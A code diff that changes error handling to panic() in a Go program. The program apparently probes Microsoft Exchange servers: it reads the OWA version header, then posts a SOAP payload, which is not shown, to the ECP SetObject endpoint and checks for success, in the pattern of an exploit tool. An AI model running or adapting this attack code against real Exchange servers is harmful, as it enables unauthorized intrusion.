@@ -15,8 +15,7 @@ func main() {
 	url = strings.TrimSuffix(url, "/")
 	r, err := http.Get(url + "/owa/auth/logon.aspx")
 	if err != nil {
-		fmt.Println("[-] Error:", err)
-		return
+		panic(err)
 	}
 	defer r.Body.Close()
 	if version, ok := r.Header["X-Owa-Version"]; ok {
@@ -70,22 +69,19 @@ xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
 	client := &http.Client{}
 	req, err := http.NewRequest("POST", url+"/ecp/DDI/DDIService.svc/SetObject", bytes.NewBufferString(payload))
 	if err != nil {
-		fmt.Println("[-] Error:", err)
-		return
+		panic(err)
 	}
 	for k, v := range headers {
 		req.Header.Set(k, v)
 	}
 	resp, err := client.Do(req)
 	if err != nil {
-		fmt.Println("[-] Error:", err)
-		return
+		panic(err)
 	}
 	defer resp.Body.Close()
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		fmt.Println("[-] Error:", err)
-		return
+		panic(err)
 	}
 
 	if resp.StatusCode == 200 && strings.Contains(string(body), "<MessageText>Success</MessageText>") {
